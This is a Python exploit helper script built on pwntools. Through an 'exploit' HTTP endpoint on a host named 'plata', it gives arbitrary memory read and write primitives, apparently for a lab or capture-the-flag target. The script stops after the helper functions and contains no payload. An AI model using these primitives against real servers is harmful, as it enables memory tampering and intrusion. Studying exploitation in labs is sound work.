import requests
import binascii

from pwn import *

url = 'http://plata:8000/'
exploit_url = url + 'exploit'

WORD_SIZE = 8
unpack_word = u64

def relative_read(offset, n):
    r = requests.get(exploit_url, params={
            'op': 'relread',
            'len': '{:d}'.format(n),
            'addr': '{:x}'.format(offset),
        }
    )

    try:
        data = binascii.unhexlify(r.content)
    except:
        raise Exception('server returned non-hex respone: {}'.format(r.content))

    return data

def abs_read(addr, n):
    r = requests.get(exploit_url, params={
            'op': 'read',
            'len': '{:d}'.format(n),
            'addr': '{:x}'.format(addr),
        }
    )

    try:
        data = binascii.unhexlify(r.content)
    except:
        raise Exception('server returned non-hex respone: {}'.format(r.content))

    return data

def write_mem(addr, data):
    hex_data = binascii.hexlify(data).decode()
    print('writing 0x{:x} {}'.format(addr, hex_data))
    r = requests.get(exploit_url, params={
            'op': 'write',
            'data': hex_data,
            'addr': '{:x}'.format(addr),
        }
    )

    '''
    check = abs_read(addr, len(data))
    if check != data:
        print(r.content)
        raise Exception('data not written!')
    '''

def write_word(addr, n):
    return write_mem(addr, p64(n))

def read_word(addr):
    return unpack_word(abs_read(addr, WORD_SIZE))

def read_u32(addr):
    return u32(abs_read(addr, 4))
    

